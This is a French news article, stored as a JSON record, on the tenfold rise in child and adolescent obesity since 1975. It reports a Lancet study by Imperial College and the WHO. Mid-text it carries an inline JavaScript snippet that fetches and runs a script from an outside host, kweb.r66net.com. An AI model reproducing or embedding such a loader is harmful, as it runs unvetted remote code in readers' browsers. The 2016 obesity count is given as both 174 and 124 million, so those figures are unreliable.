{"title": "Obesite infantile : inquietante explosion des cas dans le monde", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-10-12", "content": "Depuis 1975, le nombre d'enfants et d'adolescents obeses dans le monde a ete multiplie par dix, mais ceux dont le poids est insuffisant restent encore plus nombreux. Si les tendances se confirment, les courbes s'inverseront en 2022, predisent les specialistes, qui deplorent le manque de reponse politique a cette question de sante publique. Ce qu'il faut retenir En 40 ans, le nombre de jeunes obeses est passe de 11 a 174 millions. Parmi les pays les plus touches se trouvent des iles de Polynesie, les Etats-Unis, l'Egypte, l'Arabie Saoudite. De mauvaises habitudes alimentaires sont en cause. En 2016, 124 millions de jeunes de 5 a 19 ans etaient consideres comme obeses, contre seulement 11 millions en 1975, evalue l'etude, conduite par l 'Imperial College  de Londres et l' Organisation mondiale de la Sante  ( OMS ). Le phenomene concerne toutes les regions du monde. Les pays les plus touches sont certaines iles de Polynesie (plus de 30 % des 5-19 ans touches aux iles Cook, par exemple), tandis que ce taux atteint ou depasse 20 % aux Etats-Unis, en Egypte ou encore en Arabie saoudite. Si cette  prevalence  semble plafonner depuis quelques annees dans les pays riches, elle continue a grimper dans les pays a revenu faible ou moyen. Le saviez-vous ? L'obesite est associee a des risques accrus de maladies chroniques, telles que le diabete et les maladies cardiovasculaires. Le nombre d'enfants et d'adolescents en  insuffisance ponderale  diminue, lui, lentement depuis 2000, sauf en Asie du Sud et du Sud-Est et en Afrique du centre, de l'Est et de l'Ouest. L'an dernier, on comptait encore 192 millions d'entre eux en sous-poids modere ou severe, ajoutent les auteurs, qui ont analyse des donnees portant sur 31,5 millions de jeunes dans 200 pays. Les deux tiers de ces jeunes en sous-poids habitent en Asie du Sud-Est, notamment en Inde. Un poids trop faible augmente notamment les risques de maladies infectieuses. La transition vers une alimentation trop riche en calories mais pauvre du point de vue nutritionnel pose probleme. (c) kwanchaichaiudom, Fotolia                               De plus en plus d'aliments energetiques et pauvres en nutriments << Il y a toujours besoin de politiques qui encouragent la securite alimentaire dans les pays et les  foyers  a faible revenu. (...) Mais nos donnees montrent que la transition de l'insuffisance ponderale vers le  surpoids  de l' obesite  peut se produire rapidement >> , avertit le professeur Majid Ezzati de l' Imperial College  de Londres, qui a coordonne leurs travaux. Le specialiste de sante environnementale met en garde en particulier contre le risque de  << mauvaise transition alimentaire, avec une augmentation des  aliments  a forte teneur energetique mais pauvres en  nutriments  >>.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  \" Tres peu de politiques et de programmes essayent de rendre accessibles aux familles pauvres les aliments sains << Tres peu de politiques et de programmes essayent de rendre accessibles aux familles pauvres les aliments sains, tels que les  cereales  completes et les  fruits  et legumes frais >> , a-t-il deplore, dans un communique accompagnant l'etude. Cela entraine des inegalites sociales face a l' obesite  et limite les possibilites de reduire ce fardeau, souligne le chercheur.  Ces resultats paraissent dans la revue medicale britannique  The Lancet . Avec AFP Decouvrez les curieux ingredients de la cuisine de 2050                       Que mangerons-nous en 2050 ? A coup sur de nouveaux ingredients, qui sont deja a l'etude aujourd'hui. Nous devrons donc nous adapter a de nouvelles textures et a d'autres saveurs. Attendez-vous a des surprises. A voir ce soir sur Planete+ a 20 h 55 dans un episode etonnant de la serie Rever le futur.                                       ", "theme": "sante"}